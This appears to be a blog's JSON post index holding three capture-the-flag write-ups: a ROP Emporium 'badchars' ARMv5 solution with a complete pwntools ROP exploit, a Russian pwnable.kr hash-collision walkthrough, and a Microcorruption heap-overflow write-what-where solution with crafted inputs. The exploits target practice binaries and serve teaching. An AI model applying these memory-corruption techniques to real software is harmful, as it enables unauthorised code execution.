[
  
    {
      "title"    : "badchars - ROP Emporium",
      "category" : "",
      "tags"     : "CTF, ropemporium, and ROP",
      "url"      : "/2023/05/24/ROP-Emporium-badchars/",
      "date"     : "May 24, 2023",
      "content"  : "ROP Emporium - badchars ARMv5 solutionAlrighty, this one is a little harder than the write4 challenge.Like before we have to call the usefulFunction listed bellow with the flag.txt string:disassemble usefulFunctionDump of assembler code for function usefulFunction:   0x000105d4 &lt;+0&gt;:    push    {r11, lr}   0x000105d8 &lt;+4&gt;:    add    r11, sp, #4   0x000105dc &lt;+8&gt;:    ldr    r0, [pc, #8]    @ 0x105ec &lt;usefulFunction+24&gt;   0x000105e0 &lt;+12&gt;:    bl    0x104b4 &lt;print_file@plt&gt;   0x000105e4 &lt;+16&gt;:    nop   		 @ (mov r0, r0)   0x000105e8 &lt;+20&gt;:    pop    {r11, pc}   0x000105ec &lt;+24&gt;:    muleq    r1, r8, r6We have to follow the calling convention for ARMv5 which dictates that the first arguments are supposed to be in R0, R1, R2 and R3 respectively.Upon further inspection, the binary spills out the bad characters which will get filtered out:badchars are: 'x', 'g', 'a', '.' --&gt; 7867612eSo here we can already see the problem. 3 characters of the flag.txt string will be blocked, we need to encode them somehow.What’s our task?To solve this level we need to accomplish the following:  Write the encoded string into memory  Decode the encoded string  Call our usefulFunction with the decoded string to get our flagThere are a few different gadgets we can use to decode an encoded string:disassemble usefulGadgets  Dump of assembler code for function usefulGadgets:    SUB GADGET:   0x000105f0 &lt;+0&gt;:    ldr    r1, [r5]   0x000105f4 &lt;+4&gt;:    sub    r1, r1, r6   0x000105f8 &lt;+8&gt;:    str    r1, [r5]   0x000105fc &lt;+12&gt;:    pop    {r0, pc}      ADD GADGET:   0x00010600 &lt;+16&gt;:    ldr    r1, [r5]   0x00010604 &lt;+20&gt;:    add    r1, r1, r6   0x00010608 &lt;+24&gt;:    str    r1, [r5]   0x0001060c &lt;+28&gt;:    pop    {r0, pc}      STORE GADGET:   0x00010610 &lt;+32&gt;:    str    r3, [r4]   0x00010614 &lt;+36&gt;:    pop    {r5, r6, pc}      OR GADGET:   0x00010618 &lt;+40&gt;:    ldr    r1, [r5]   0x0001061c &lt;+44&gt;:    eor    r1, r1, r6   0x00010620 &lt;+48&gt;:    str    r1, [r5]   0x00010624 &lt;+52&gt;:    pop    {r0, pc}With the help of these gadgets we can decode a string using subtraction, addition or logical OR.I’ll shift the flag.txt by one so I’ll be using the ADD GADGETEncoded string: flag.txt - 1 = ek`f-swsNow when the binary asks for input, we can successfully get this encoded string to memory without getting any of the characters filtered out.After that all that’s left is to use the ADD GADGET to decoded it back and call our usefulFunction to print the contents of the flag.Controlling the PC registerTo find out how many bytes we need in order to control the flow of execution we can use the following snipet:def find_pc_offset(payload, alpha):   io = start()   io.sendlineafter("&gt; ", payload)   io.wait() # wait for crash   core = io.corefile   pc_value = core.pc   pc_offset = cyclic_find(pc_value, alphabet=alpha)   info("Found PC offset at: %#x", pc_offset)   return pc_offset# badchars are: 'x', 'g', 'a', '.'# python -c 'from pwn import *; print(enhex(b"xga."))' = 7867612ealpha = 'bcde'payload = cyclic(100, alphabet=alpha)pc_offset = find_pc_offset(payload, alpha)So after 44 (0x2c) bytes we can redirect the execution to our gadgetsBuilding the gadgetFirst things first, we need to store our encoded string somewhere using the STORE GADGET listed bellow: STORE GADGET:   0x00010610 &lt;+32&gt;:    str    r3, [r4]   0x00010614 &lt;+36&gt;:    pop    {r5, r6, pc}The string flag.txt or rather ek`f-sws is 8 bytes long, where can we store this inside the target binary?We can check out the ELF sections for the target:readelf -S badchars_armv5There are 29 section headers, starting at offset 0x1bb4:Заголовки разделов:  [Нм] Имя           	Тип         	Адрес	Смещ   Разм   ES Флг Сс Инф Al  [ 0]               	NULL        	00000000 000000 000000 00  	0   0  0  [ 1] .interp       	PROGBITS    	00010154 000154 000013 00   A  0   0  1  [ 2] .note.ABI-tag 	NOTE        	00010168 000168 000020 00   A  0   0  4  [ 3] .note.gnu.bu[...] NOTE        	00010188 000188 000024 00   A  0   0  4  [ 4] .gnu.hash     	GNU_HASH    	000101ac 0001ac 000060 04   A  5   0  4  [ 5] .dynsym       	DYNSYM      	0001020c 00020c 000110 10   A  6   1  4  [ 6] .dynstr       	STRTAB      	0001031c 00031c 0000e0 00   A  0   0  1  [ 7] .gnu.version  	VERSYM      	000103fc 0003fc 000022 02   A  5   0  2  [ 8] .gnu.version_r	VERNEED     	00010420 000420 000020 00   A  6   1  4  [ 9] .rel.dyn      	REL         	00010440 000440 000008 08   A  5   0  4  [10] .rel.plt      	REL         	00010448 000448 000028 08  AI  5  21  4  [11] .init         	PROGBITS    	00010470 000470 00000c 00  AX  0   0  4  [12] .plt          	PROGBITS    	0001047c 00047c 000050 04  AX  0   0  4  [13] .text         	PROGBITS    	000104cc 0004cc 0001c0 00  AX  0   0  4  [14] .fini         	PROGBITS    	0001068c 00068c 000008 00  AX  0   0  4  [15] .rodata       	PROGBITS    	00010694 000694 000010 00   A  0   0  4  [16] .ARM.exidx    	ARM_EXIDX   	000106a4 0006a4 000008 00  AL 13   0  4  [17] .eh_frame     	PROGBITS    	000106ac 0006ac 000004 00   A  0   0  4  [18] .init_array   	INIT_ARRAY  	00020f00 000f00 000004 04  WA  0   0  4  [19] .fini_array   	FINI_ARRAY  	00020f04 000f04 000004 04  WA  0   0  4  [20] .dynamic      	DYNAMIC     	00020f08 000f08 0000f8 08  WA  6   0  4  [21] .got          	PROGBITS    	00021000 001000 000024 04  WA  0   0  4  [22] .data         	PROGBITS    	00021024 001024 000008 00  WA  0   0  4  [23] .bss          	NOBITS      	0002102c 00102c 000004 00  WA  0   0  1  [24] .comment      	PROGBITS    	00000000 00102c 000030 01  MS  0   0  1  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 00105c 000028 00  	0   0  1  [26] .symtab       	SYMTAB      	00000000 001084 0006d0 10 	27  84  4  [27] .strtab       	STRTAB      	00000000 001754 000358 00  	0   0  1  [28] .shstrtab     	STRTAB      	00000000 001aac 000105 00  	0   0  1The data section at [22] has exactly the 8 bytes we need!What needs to be done now is to get the address of the data section into R4 and the encoded string into R3 for the STORE GAGDETLet’s use ropper to see if we can find gadgets to POP into these registers.ropper --file=badchars_armv5 --search "pop"[INFO] Load gadgets from cache[LOAD] loading... 100%[LOAD] removing double gadgets... 100%[INFO] Searching for gadgets: pop[INFO] File: badchars_armv50x000105d0: pop {fp, pc};0x000105fc: pop {r0, pc};0x00010478: pop {r3, pc};0x000105b0: pop {r4, pc};0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc};0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r8, asr #17; andeq r0, r1, r0, asr #17; bx lr;0x00010614: pop {r5, r6, pc};0x000105a0: popne {r4, pc}; bl #0x52c; mov r3, #1; strb r3, [r4]; pop {r4, pc};Notice anything strange? The pop {r3, pc}; gadget is at 0x00010478 but this address contains 0x78 which is one of our bad characters (7867612e), therefore we cannot use this gadget.Luckily as stated in the challenge page, ropper has a bad characters option to help us here:ropper --file=badchars_armv5 --search "pop" -b 7867612e[INFO] Load gadgets from cache[LOAD] loading... 100%[LOAD] filtering badbytes... 100%[LOAD] removing double gadgets... 100%[INFO] Searching for gadgets: pop[INFO] File: badchars_armv50x000105d0: pop {fp, pc};0x000105fc: pop {r0, pc};0x00010690: pop {r3, pc};0x000105b0: pop {r4, pc};0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc};0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r8, asr #17; andeq r0, r1, r0, asr #17; bx lr;0x00010614: pop {r5, r6, pc};0x000105a0: popne {r4, pc}; bl #0x52c; mov r3, #1; strb r3, [r4]; pop {r4, pc};There we go!  0x00010690: pop {r3, pc}; is a much better gadget and won’t cause us any problemsRemember that we’re dealing with 4 byte registers so to store our 8 byte-encoded flag we need to call the storage gadget twice:encoded_flag = b'ek`f-sws'# write first 4 bytes of encoded flagpayload = b"A" * pc_offsetpayload += pop_r3_gadgetpayload += encoded_flag[:4]payload += pop_r4_gadgetpayload += p32(datasection_addr)payload += storage_gadgetpayload += p32(datasection_addr)# r5payload += p32(0x1) # r6# write remaining 4 bytes of the encoded flagpayload += pop_r3_gadgetpayload += encoded_flag[4:]payload += pop_r4_gadgetpayload += p32(datasection_addr + 4)payload += storage_gadgetpayload += p32(datasection_addr)# r5payload += p32(0x1) # r6The STORE GADGET also pops into R5 and R6 which will be used by the ADD GADGET. Thus, when storing the flag in data section we already pop the right values (datasection_addr and 0x1 since our encoded flag was shifted by one as described earlier).Ok, so we’re done with first step. Now we need to decode this string back to its original form before calling our function  Write the encoded string into memory  Decode the encoded string  Call our usefulFunction with the decoded string to get our flagThe ADD GadgetNow that our encoded string is inside the data section we can use the ADD GADGET to decode it:   0x00010600 &lt;+16&gt;:    ldr    r1, [r5]   0x00010604 &lt;+20&gt;:    add    r1, r1, r6   0x00010608 &lt;+24&gt;:    str    r1, [r5]   0x0001060c &lt;+28&gt;:    pop    {r0, pc}For this gadget to work we need to store the data section address into R5 and 0x1 into R6, that way it’ll shift the string ek`f-sws back to flag.txt.This has been done already in the previous step when setting up the STORE GADGET. However this gadget will only decode one byte at a time, so we can use the following snipet to decoded the whole string:add_xploit = b""for i in range(len(encoded_flag)):   add_xploit += pop_r5_r6_gadget   add_xploit += p32(datasection_addr + i)   add_xploit += p32(0x1) # shift back   add_xploit += add_gadget   add_xploit += p32(datasection_addr)Nice, now we just need to call usefulFunction to get our flag.  Write the encoded string into memory  Decode the encoded string  Call our usefulFunction with the decoded string to get our flagThis should be easy enough, just adding its address to the payload will do:payload += call_print  Write the encoded string into memory  Decode the encoded string  Call our usefulFunction with the decoded string to get our flagExploitHere’s the full exploit:from pwn import *context.binary = elf = ELF('badchars_armv5')context.log_level = 'info'gs = '''continue'''def start():   if args.GDB:       return gdb.debug(elf.path, gdbscript=gs)   else:       return process(elf.path)  def find_pc_offset(payload, alpha):   io = start()   io.sendlineafter("&gt; ", payload)   io.wait() # wait for crash   core = io.corefile   pc_value = core.pc   pc_offset = cyclic_find(pc_value, alphabet=alpha)   info("Found PC offset at: %#x", pc_offset)   return pc_offset# badchars are: 'x', 'g', 'a', '.'# python -c 'from pwn import *; print(enhex(b"xga."))' = 7867612ealpha = 'bcde'payload = cyclic(100, alphabet=alpha)pc_offset = find_pc_offset(payload, alpha)io = start()datasection_addr = elf.symbols['__data_start']call_print = p32(0x000105e0)storage_gadget = p32(0x00010610)add_gadget = p32(0x00010600)# gadgetspop_r0_gadget = p32(0x000105fc) #: pop {r0, pc};pop_r3_gadget = p32(0x00010690) # : pop {r4, pc};pop_r4_gadget = p32(0x000105b0) #: pop {r4, pc};pop_r5_r6_gadget = p32(0x00010614) #: pop {r5, r6, pc};info('%#x - data section', datasection_addr)# goal: write encoded string to data section#flag.txt - 1 -&gt; ek`f-swsencoded_flag = b'ek`f-sws'# decoded our encoded stringadd_xploit = b""for i in range(len(encoded_flag)):   add_xploit += pop_r5_r6_gadget   add_xploit += p32(datasection_addr + i)   add_xploit += p32(0x1)   add_xploit += add_gadget   add_xploit += p32(datasection_addr)# write first 4 bytes of encoded flagpayload = b"A" * pc_offsetpayload += pop_r3_gadgetpayload += encoded_flag[:4]payload += pop_r4_gadgetpayload += p32(datasection_addr)payload += storage_gadgetpayload += p32(datasection_addr)# r5payload += p32(0x1) # r6# write remaining 4 bytes of the encoded flagpayload += pop_r3_gadgetpayload += encoded_flag[4:]payload += pop_r4_gadgetpayload += p32(datasection_addr + 4)payload += storage_gadgetpayload += p32(datasection_addr)# r5payload += p32(0x1) # r6# decode and pwnpayload += add_xploitpayload += call_printio.sendlineafter("&gt; ", payload)io.recvuntil("Thank you!\n")flag = io.recv()success(flag)Execute it and voilà, we got our flag![+] ROPE{a_placeholder_32byte_flag!}",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2023/05/24/ROP-Emporium-badchars/'> <img src='/media/posts_thumb/badchars.png' alt='badchars - ROP Emporium'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>14 min read <time class='article__date' datetime='2023-05-24T18:00:30-03:00'>May 24, 2023</time> </span> </div><h2 class='article__title'>badchars - ROP Emporium</h2> <p class='article__excerpt'>ROP ARMv5 writeup</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Sanya'><img class='article__author-image' src='/images/15.png' alt='Sanya's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Sanya</a><span> in </span> <span class='article-tags'> <a href='/tag/CTF' class='article__tag'>CTF</a>  <a href='/tag/ropemporium' class='article__tag'>ropemporium</a>  <a href='/tag/ROP' class='article__tag'>ROP</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Hash Collision - pwnable.kr - решение",
      "category" : "",
      "tags"     : "CTF, pwnable.kr, and hash",
      "url"      : "/2023/03/12/Hash-Collision-pwnablekr/",
      "date"     : "Mar 12, 2023",
      "content"  : "решение задания collision - pwnable.krчто такое хеш-функция?  криптографическая хеш-функция (CHF ) - математический алгоритм, который отображает данные произвольных размер (часто называемый «сообщением») в битовый массив фиксированного размера («хеш-значение», «хеш» или «дайджест сообщения»1Хеш-функция берёт определённую информацию и преобразует эту информацию в строку определенной длины. Исходные данные могут быть любыми, от пароля вашего аккаунта до фильмов или книг.  Эта строка всегда будет иметь одинаковую длину вне зависимости от того, какого размера была входная информация.Есть очень важный момент:      небольшое изменение в сообщении должно изменить значение хеш-функции настолько сильно, что новое значение хеш-функции будет не коррелировать со старым хеш-значение (лавинный эффект )1  Например2:pwnable.kr - colИтак, у нас есть 3 файла, слева мы видим наши полномочия, где ‘s’ означает SUID3, то есть, мы можем запускать файл с правами владельца.давайте посмотрим содержимое файла col.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){        int* ip = (int*)p;        int i;        int res=0;        for(i=0; i&lt;5; i++){                res += ip[i];        }        return res;}int main(int argc, char* argv[]){        if(argc&lt;2){                printf("usage : %s [passcode]\n", argv[0]);                return 0;        }        if(strlen(argv[1]) != 20){                printf("passcode length should be 20 bytes\n");                return 0;        }        if(hashcode == check_password( argv[1] )){                system("/bin/cat flag");                return 0;        }        else                printf("wrong passcode.\n");        return 0;}Программа принимает в качестве аргумента строку из 20 символов. Строка предстаёт в виде 5 чисел, эти числа суммируются и их сумма проверятся со значением 0x21DD09EC.Проблема в том, что 0x21DD09EC не делится на 5. Нам нужно задать 5 чисел, сумма которых равна 0x21DD09EC.Давайте поделим 0x21DD09EC  на 5, возьмём результат без остатка, умножим на 4 и вычтем из 0x21DD09EC.итак, наша строка будет выглядеть следующим образом: 0x6c5cec8 * 4 + 0x6c5cecc.Список литературы:            https://ru.wikibrief.org/wiki/Cryptographic_hash_function &#8617; &#8617;2              https://www.kaspersky.ru/blog/the-wonders-of-hashing/3633/ &#8617;              https://ru.wikipedia.org/wiki/Suid &#8617;      ",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2023/03/12/Hash-Collision-pwnablekr/'> <img src='/media/posts_thumb/collision.png' alt='Hash Collision - pwnable.kr - решение'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>2 min read <time class='article__date' datetime='2023-03-12T18:00:30-03:00'>Mar 12, 2023</time> </span> </div><h2 class='article__title'>Hash Collision - pwnable.kr - решение</h2> <p class='article__excerpt'>CTF Writeup pwnable.kr</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Sanya'><img class='article__author-image' src='/images/15.png' alt='Sanya's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Sanya</a><span> in </span> <span class='article-tags'> <a href='/tag/CTF' class='article__tag'>CTF</a>  <a href='/tag/pwnable.kr' class='article__tag'>pwnable.kr</a>  <a href='/tag/hash' class='article__tag'>hash</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Microcorruption UAF Exploitation - Algiers",
      "category" : "",
      "tags"     : "CTF, microcorruption, and uaf",
      "url"      : "/2023/02/06/UAF-Exploitation-MicrocorruptionCTF/",
      "date"     : "Feb 6, 2023",
      "content"  : "Microcorruption - AlgiersThis level involves  Use after free(UAF)/Heap exploitationThe only thing main is doing is  calling the login function, which ends up saving its return address (0x4440) which we’ll use later on. This value is stored at 0x439a4438 &lt;main&gt;4438:  3150 9cff      add	#0xff9c, sp443c:  b012 3a46      call	#0x463a &lt;login&gt;4440 &lt;__stop_progExec__&gt;4440:  32d0 f000      bis	#0xf0, sr4444:  fd3f           jmp	#0x4440 &lt;__stop_progExec__+0x0&gt;Live Memory Dump0000:   0000 4400 0000 0000 0000 0000 0000 0000   ..D.............0010:   *0150:   0000 0000 0000 0000 0000 0000 085a 0000   .............Z..0160:   *2400:   0824 0010 0100 0000 0000 0000 0000 0000   .$..............2410:   *4390:   0000 0000 0000 0000 0000 4044 0000 0000   ..........@D....                                  ^The login function looks like this:463a &lt;login&gt;463a:  0b12           push	r11463c:  0a12           push	r10463e:  3f40 1000      mov	#0x10, r154642:  b012 6444      call	#0x4464 &lt;malloc&gt;4646:  0a4f           mov	r15, r104648:  3f40 1000      mov	#0x10, r15464c:  b012 6444      call	#0x4464 &lt;malloc&gt;4650:  0b4f           mov	r15, r114652:  3f40 9a45      mov	#0x459a, r154656:  b012 1a47      call	#0x471a &lt;puts&gt;465a:  3f40 c845      mov	#0x45c8, r15465e:  b012 1a47      call	#0x471a &lt;puts&gt;4662:  3e40 3000      mov	#0x30, r144666:  0f4a           mov	r10, r154668:  b012 0a47      call	#0x470a &lt;getsn&gt;466c:  3f40 c845      mov	#0x45c8, r154670:  b012 1a47      call	#0x471a &lt;puts&gt;4674:  3f40 d445      mov	#0x45d4, r154678:  b012 1a47      call	#0x471a &lt;puts&gt;467c:  3e40 3000      mov	#0x30, r144680:  0f4b           mov	r11, r154682:  b012 0a47      call	#0x470a &lt;getsn&gt;4686:  0f4b           mov	r11, r154688:  b012 7045      call	#0x4570 &lt;test_password_valid&gt;468c:  0f93           tst	r15468e:  0524           jz	#0x469a &lt;login+0x60&gt;4690:  b012 6445      call	#0x4564 &lt;unlock_door&gt;4694:  3f40 0b46      mov	#0x460b, r154698:  023c           jmp	#0x469e &lt;login+0x64&gt;469a:  3f40 1b46      mov	#0x461b, r15469e:  b012 1a47      call	#0x471a &lt;puts&gt;46a2:  0f4b           mov	r11, r1546a4:  b012 0845      call	#0x4508 &lt;free&gt;46a8:  0f4a           mov	r10, r1546aa:  b012 0845      call	#0x4508 &lt;free&gt;46ae:  3a41           pop	r1046b0:  3b41           pop	r1146b2:  3041           retWe can see that it’s malloc’ing 0x10 bytes but gets’ing 0x30 bytes, so what can we do with this? The first thing we should try is to corrupt the heap structure somehow, but first we need to take a look at how it’s implemented.The program  also tells us that both the username and password must be between 8 and 16 characters each. So let’s try the following:  username: AAAAAAAA  password:  BBBBBBBBAfter entering these values we can take a look at the memory dump:Live Memory Dump2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA2410:   4141 4141 4141 0000 0000 0000 0000 0824   AAAAAA.........$                                  prev chunk ^ 2420:   3424 2100 4242 4242 4242 4242 0000 0000   4$!.BBBBBBBB....2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........So it seems that the heap starts at 2408 and it uses a 6 byte header made of:  2 bytes for the address of the previous chunk  2 bytes for the address of next chunk  2 bytes for the size of the chunk  the third field of the header where we save the size of the chunk is actually saving the value of: 2 * sizeof the chunk + the last bit set to indicate that the chunk is being used  So in this case since we used malloc(0x10) the total size is 0x20 + 0x1 = 0x21  Same thing happens for the second chunk, size is stored at 2422Here we have 2 chunks, one for the username and other for passwordSo at 2408 we see that value 2408(stored as 0824 due to the  endianness) meaning the previous chunk is 2408 itself as this is the first chunk of the heapThen, at 240a we have the value 241e which shows us the start of the next chunk containing the password buffer made of the 42’s (B’s) that we typed earlier.To summarize:  We have two chunks in the heap, starting at 2408  each chunk is made of a 6-byte header containing the address of the previous chunk, the address of the next chunk and its size  in this case each chunk contains the 6 byte header plus 0x10 bytes for the buffer allocated with malloc(0x10)We can already see that malloc(0x10) is actually using more bytes than just 0x10.The second chunk (the one with the supplied password) starts at 241e right after the username buffer.Our goal is to overflow the heap header of the second chunk starting at 0x241e with a username larger than 0x10 so that when free() kicks in it will overwrite an address with a value of our choiceSo we use the username buffer of the first chunk to overflow the second chunk header so that we can have a ‘write what to where’ condition.The free function:508 &lt;free&gt;4508:  0b12           push	r11450a:  3f50 faff      add	#0xfffa, r15450e:  1d4f 0400      mov	0x4(r15), r134512:  3df0 feff      and	#0xfffe, r134516:  8f4d 0400      mov	r13, 0x4(r15)451a:  2e4f           mov	@r15, r14451c:  1c4e 0400      mov	0x4(r14), r124520:  1cb3           bit	#0x1, r124522:  0d20           jnz	#0x453e &lt;free+0x36&gt;4524:  3c50 0600      add	#0x6, r124528:  0c5d           add	r13, r12452a:  8e4c 0400      mov	r12, 0x4(r14)452e:  9e4f 0200 0200 mov	0x2(r15), 0x2(r14)4534:  1d4f 0200      mov	0x2(r15), r134538:  8d4e 0000      mov	r14, 0x0(r13)453c:  2f4f           mov	@r15, r15453e:  1e4f 0200      mov	0x2(r15), r144542:  1d4e 0400      mov	0x4(r14), r134546:  1db3           bit	#0x1, r134548:  0b20           jnz	#0x4560 &lt;free+0x58&gt;454a:  1d5f 0400      add	0x4(r15), r13454e:  3d50 0600      add	#0x6, r134552:  8f4d 0400      mov	r13, 0x4(r15)4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)455c:  8e4f 0000      mov	r15, 0x0(r14)4560:  3b41           pop	r114562:  3041           retExploiting the heapSo let’s try using a username long enough to overflow the second chunk’s header:  Username: A * 16 + BB + CC + DD  Password: doesn’t really matter, I’ll just use 0x4949This gives that following memory dumpLive Memory Dump0000:   0000 4400 0000 0000 0000 0000 0000 0000   ..D.............0010:   3041 0000 0000 0000 0000 0000 0000 0000   0A..............0020:   *0150:   0000 0000 0000 0000 0000 0000 085a 0000   .............Z..0160:   *2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA2410:   4141 4141 4141 4141 4141 4141 4141 4242   AAAAAAAAAAAAAABB2420:   4343 4444 4949 0000 0000 0000 0000 0000   CCDDII..........2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........So the 6-byte header of the second chunk is overwritten with BBCCDD, stepping through the first lines of the free function, we see that a value is written to BB+4.Well, we want to overwrite main’s return address which is at 439a, so we should set BB to be 439a - 4 = 4396.So whenever BB = 0x4396 free() will overwrite main’s return address with a particular value.So far we have:  Username = A*16 + 0x4396 + CC + DDNow how do we figure out the values of CC and DD so that we can successfully change the flow of execution so that main() returns to an address of our choice?If you look closely at free(), the value at our target address 0x439a is 4440(this is where main will return to) is being added to 6 and to DD.So basically main’s return value is overwritten with:0x4440 (which it its original value) + 0x6 + DDWe need this sum to be equal to the address of the unlock_door function at 4564, so we can solve for DD:0x4440  + 0x6 + DD = 4564DD = 0x11eUpdating our username, now we have:  Username = A * 16 + 0x4396 + CC + 0x11eNote:If we just use this username as it is, it will overwrite our target value with the address of the unlock_door function. This happens at452a:  8e4c 0400      mov	r12, 0x4(r14)where r12 contains the result of our sum, and 0x4(r14) is our BB+4, namely 439a which contains the value of the return address of main.However, you will get a load address unaligned: 4343 warning due to the following line:4538:  8d4e 0000      mov	r14, 0x0(r13)at this point r14 = 4396 (i.e 439a - 4), and r13 = 4343 which is CC.So CC is not a valid address for this. What value can we choose?Let’s take a look at the memory dump again:Live Memory Dump2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA2410:   4141 4141 4141 4141 4141 4141 4141 9643   AAAAAAAAAAAAAA.C2420:   4343 1e01 4949 0000 0000 0000 0000 0000   CC..II..........2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........2440:   *4380:   0000 0000 ca46 0100 ca46 0300 3e47 0000   .....F...F..&gt;G..4390:   0a00 2424 a846 0000 4343 6445 0000 0000   ..$$.F..CCdE....43a0:   *4400:   3140 0044 1542 5c01 75f3 35d0 085a 3f40   1@.D.B\.u.5..Z?@4410:   0600 0f93 0724 8245 5c01 2f83 9f4f 4847   .....$.E\./..OHG4420:   0024 f923 3f40 0000 0f93 0624 8245 5c0From what I tested both  4410 and 4420  are valid values for CC.Now we just put the pieces togetherSolution  Username: A * 16 + 0x4396 + 4420 + 0x11e  Username = 41414141414141414141414141414141964320441e01or  Username = 41414141414141414141414141414141964310441e01",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2023/02/06/UAF-Exploitation-MicrocorruptionCTF/'> <img src='/media/posts_thumb/uaf.png' alt='Microcorruption UAF Exploitation - Algiers'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>8 min read <time class='article__date' datetime='2023-02-06T18:00:30-03:00'>Feb 6, 2023</time> </span> </div><h2 class='article__title'>Microcorruption UAF Exploitation - Algiers</h2> <p class='article__excerpt'>CTF Writeup</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Sanya'><img class='article__author-image' src='/images/15.png' alt='Sanya's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Sanya</a><span> in </span> <span class='article-tags'> <a href='/tag/CTF' class='article__tag'>CTF</a>  <a href='/tag/microcorruption' class='article__tag'>microcorruption</a>  <a href='/tag/uaf' class='article__tag'>uaf</a> </span></div></div></div></div></div>"
    } 
  
]
